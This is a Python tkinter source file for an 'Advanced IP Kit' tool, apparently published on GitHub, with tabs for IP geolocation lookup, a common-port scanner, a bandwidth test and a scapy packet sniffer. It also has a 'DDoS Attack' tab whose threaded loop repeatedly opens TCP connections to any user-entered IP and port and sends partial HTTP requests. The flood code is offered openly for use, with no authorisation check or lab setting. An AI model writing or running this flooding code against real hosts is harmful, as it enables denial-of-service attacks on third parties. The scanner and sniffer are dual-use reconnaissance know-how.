import tkinter as tk
from tkinter import ttk
import requests
import socket
import threading
import time
from scapy.all import sniff
import speedtest

class AdvancedIPKit:
    def __init__(self, root):
        self.root = root
        self.root.title("Advanced IP Kit | Github/wiced1")
        self.root.geometry("800x600")  # Increased size for better visibility
        self.create_widgets()

    def create_widgets(self):
        # Create tabs
        self.notebook = ttk.Notebook(self.root)
        self.notebook.pack(expand=True, fill='both')
        self.create_tab('DDoS Attack', self.create_ddos_tab)
        self.create_tab('IP Lookup', self.create_ip_lookup_tab)
        self.create_tab('Port Scanner', self.create_port_scanner_tab)
        self.create_tab('Bandwidth Tester', self.create_bandwidth_tester_tab)
        self.create_tab('Packet Sniffer', self.create_packet_sniffer_tab)

    def create_tab(self, tab_name, content_func):
        tab_frame = ttk.Frame(self.notebook)
        self.notebook.add(tab_frame, text=tab_name)
        content_func(tab_frame)

    def create_ddos_tab(self, frame):
        # DDoS Attack elements
        self.target_ip_label = tk.Label(frame, text="Target IP:")
        self.target_ip_label.pack(pady=5)
        self.target_ip_entry = tk.Entry(frame, width=30)
        self.target_ip_entry.pack(pady=5)

        self.target_port_label = tk.Label(frame, text="Target Port:")
        self.target_port_label.pack(pady=5)
        self.target_port_entry = tk.Entry(frame, width=30)
        self.target_port_entry.pack(pady=5)

        self.ddos_start_button = tk.Button(frame, text="Start Attack", command=self.start_ddos_attack, bg="red", fg="white", font=("Helvetica", 12, "bold"))
        self.ddos_start_button.pack(pady=10)

        self.ddos_status_label = tk.Label(frame, text="Status: Idle")
        self.ddos_status_label.pack(pady=5)

        self.ddos_output = tk.Text(frame, height=10, width=50, state='disabled')
        self.ddos_output.pack(pady=10)

        self.stop_ddos_button = tk.Button(frame, text="Stop Attack", command=self.stop_ddos_attack, bg="grey", fg="white", font=("Helvetica", 12, "bold"))
        self.stop_ddos_button.pack(pady=10)

        self.attack_thread = None
        self.attack_running = False

    def start_ddos_attack(self):
        target_ip = self.target_ip_entry.get()
        target_port = self.target_port_entry.get()

        if not target_ip or not target_port:
            self.update_ddos_output("Error: IP or port cannot be empty.")
            return

        self.attack_running = True
        self.ddos_status_label.config(text="Status: Attack started")
        self.update_ddos_output("DDoS attack started.\n")
        self.attack_thread = threading.Thread(target=self.tcp_flood, args=(target_ip, int(target_port)))
        self.attack_thread.daemon = True
        self.attack_thread.start()

    def stop_ddos_attack(self):
        self.attack_running = False
        self.ddos_status_label.config(text="Status: Attack stopped")
        self.update_ddos_output("DDoS attack stopped.\n")

    def tcp_flood(self, target_ip, target_port):
        while self.attack_running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(1)
                s.connect((target_ip, target_port))
                s.sendto(b'GET / HTTP/1.1\r\n', (target_ip, target_port))
                s.close()
                self.update_ddos_output("Packet sent to {}:{}".format(target_ip, target_port))
            except Exception as e:
                self.update_ddos_output(f"Error: {str(e)}")
                break
            time.sleep(0.1)  # Adjust delay to control attack speed
        self.update_ddos_output("Attack finished.\n")

    def update_ddos_output(self, message):
        self.root.after(0, self._update_ddos_output, message)

    def _update_ddos_output(self, message):
        self.ddos_output.config(state='normal')
        self.ddos_output.insert(tk.END, message + '\n')
        self.ddos_output.config(state='disabled')
        self.ddos_output.yview(tk.END)

    def create_ip_lookup_tab(self, frame):
        # IP Lookup elements
        self.ip_lookup_label = tk.Label(frame, text="Enter IP Address:")
        self.ip_lookup_label.pack(pady=5)
        self.ip_lookup_entry = tk.Entry(frame, width=30)
        self.ip_lookup_entry.pack(pady=5)

        self.ip_lookup_button = tk.Button(frame, text="Lookup IP", command=self.lookup_ip, bg="cyan", fg="black", font=("Helvetica", 12, "bold"))
        self.ip_lookup_button.pack(pady=10)

        self.ip_lookup_output = tk.Text(frame, height=15, width=80, state='disabled')
        self.ip_lookup_output.pack(pady=10)

    def lookup_ip(self):
        ip_address = self.ip_lookup_entry.get()
        if not ip_address:
            self.update_ip_lookup_output("Error: IP address cannot be empty.")
            return

        self.update_ip_lookup_output("Loading...")
        threading.Thread(target=self.ip_lookup_task, args=(ip_address,), daemon=True).start()

    def ip_lookup_task(self, ip_address):
        try:
            url = f"https://ipinfo.io/{ip_address}/json"
            response = requests.get(url, timeout=10)
            data = response.json()
            
            output = (
                f"IP Address: {data.get('ip', 'N/A')}\n"
                f"Hostname: {data.get('hostname', 'N/A')}\n"
                f"City: {data.get('city', 'N/A')}\n"
                f"Region: {data.get('region', 'N/A')}\n"
                f"Country: {data.get('country', 'N/A')}\n"
                f"Location: {data.get('loc', 'N/A')}\n"
                f"Organization: {data.get('org', 'N/A')}\n"
            )
        except requests.exceptions.RequestException as e:
            output = f"Error: {str(e)}"
        self.update_ip_lookup_output(output)

    def update_ip_lookup_output(self, message):
        self.root.after(0, self._update_ip_lookup_output, message)

    def _update_ip_lookup_output(self, message):
        self.ip_lookup_output.config(state='normal')
        self.ip_lookup_output.delete(1.0, tk.END)
        self.ip_lookup_output.insert(tk.END, message)
        self.ip_lookup_output.config(state='disabled')

    def create_port_scanner_tab(self, frame):
        # Port Scanner elements
        self.port_scan_label = tk.Label(frame, text="Enter IP Address:")
        self.port_scan_label.pack(pady=5)
        self.port_scan_entry = tk.Entry(frame, width=30)
        self.port_scan_entry.pack(pady=5)

        self.scan_ports_button = tk.Button(frame, text="Scan Ports", command=self.scan_ports, bg="green", fg="white", font=("Helvetica", 12, "bold"))
        self.scan_ports_button.pack(pady=10)

        self.port_scan_output = tk.Text(frame, height=15, width=80, state='disabled')
        self.port_scan_output.pack(pady=10)

    def scan_ports(self):
        ip_address = self.port_scan_entry.get()
        if not ip_address:
            self.update_port_scan_output("Error: IP address cannot be empty.")
            return

        self.update_port_scan_output("Scanning...")
        threading.Thread(target=self.port_scan_task, args=(ip_address,), daemon=True).start()

    def port_scan_task(self, ip_address):
        common_ports = [21, 22, 23, 25, 53, 80, 110, 143, 443, 993, 995]
        open_ports = []
        for port in common_ports:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                result = sock.connect_ex((ip_address, port))
                if result == 0:
                    open_ports.append(port)
                sock.close()
            except socket.gaierror:
                self.update_port_scan_output("Error: Invalid IP address.")
                return
            except Exception as e:
                self.update_port_scan_output(f"Error: {str(e)}")
                return

        if open_ports:
            open_ports_str = ', '.join(map(str, open_ports))
            output = f"Open ports: {open_ports_str}"
        else:
            output = "No open ports found."
        self.update_port_scan_output(output)

    def update_port_scan_output(self, message):
        self.root.after(0, self._update_port_scan_output, message)

    def _update_port_scan_output(self, message):
        self.port_scan_output.config(state='normal')
        self.port_scan_output.delete(1.0, tk.END)
        self.port_scan_output.insert(tk.END, message)
        self.port_scan_output.config(state='disabled')

    def create_bandwidth_tester_tab(self, frame):
        # Bandwidth Tester elements
        self.bandwidth_test_button = tk.Button(frame, text="Test Bandwidth", command=self.test_bandwidth, bg="blue", fg="white", font=("Helvetica", 12, "bold"))
        self.bandwidth_test_button.pack(pady=10)

        self.bandwidth_output = tk.Text(frame, height=10, width=80, state='disabled')
        self.bandwidth_output.pack(pady=10)

    def test_bandwidth(self):
        self.update_bandwidth_output("Testing bandwidth...")
        threading.Thread(target=self.bandwidth_test_task, daemon=True).start()

    def bandwidth_test_task(self):
        try:
            st = speedtest.Speedtest()
            st.get_best_server()
            download_speed = st.download() / 1_000_000  # Convert to Mbps
            upload_speed = st.upload() / 1_000_000  # Convert to Mbps
            ping = st.results.ping

            output = (
                f"Download Speed: {download_speed:.2f} Mbps\n"
                f"Upload Speed: {upload_speed:.2f} Mbps\n"
                f"Ping: {ping} ms\n"
            )
        except Exception as e:
            output = f"Error: {str(e)}"
        self.update_bandwidth_output(output)

    def update_bandwidth_output(self, message):
        self.root.after(0, self._update_bandwidth_output, message)

    def _update_bandwidth_output(self, message):
        self.bandwidth_output.config(state='normal')
        self.bandwidth_output.delete(1.0, tk.END)
        self.bandwidth_output.insert(tk.END, message)
        self.bandwidth_output.config(state='disabled')

    def create_packet_sniffer_tab(self, frame):
        # Packet Sniffer elements
        self.packet_sniff_button = tk.Button(frame, text="Start Packet Sniffer", command=self.start_packet_sniffer, bg="grey", fg="white", font=("Helvetica", 12, "bold"))
        self.packet_sniff_button.pack(pady=10)

        self.packet_output = tk.Text(frame, height=15, width=80, state='disabled')
        self.packet_output.pack(pady=10)

    def start_packet_sniffer(self):
        self.update_packet_output("Sniffing...")
        threading.Thread(target=self.packet_sniffer_task, daemon=True).start()

    def packet_sniffer_task(self):
        def packet_callback(packet):
            self.update_packet_output(f"Packet: {packet.summary()}")

        sniff(prn=packet_callback, count=10)  # Adjust count as needed

    def update_packet_output(self, message):
        self.root.after(0, self._update_packet_output, message)

    def _update_packet_output(self, message):
        self.packet_output.config(state='normal')
        self.packet_output.insert(tk.END, message + '\n')
        self.packet_output.config(state='disabled')
        self.packet_output.yview(tk.END)

if __name__ == "__main__":
    root = tk.Tk()
    app = AdvancedIPKit(root)
    root.mainloop()
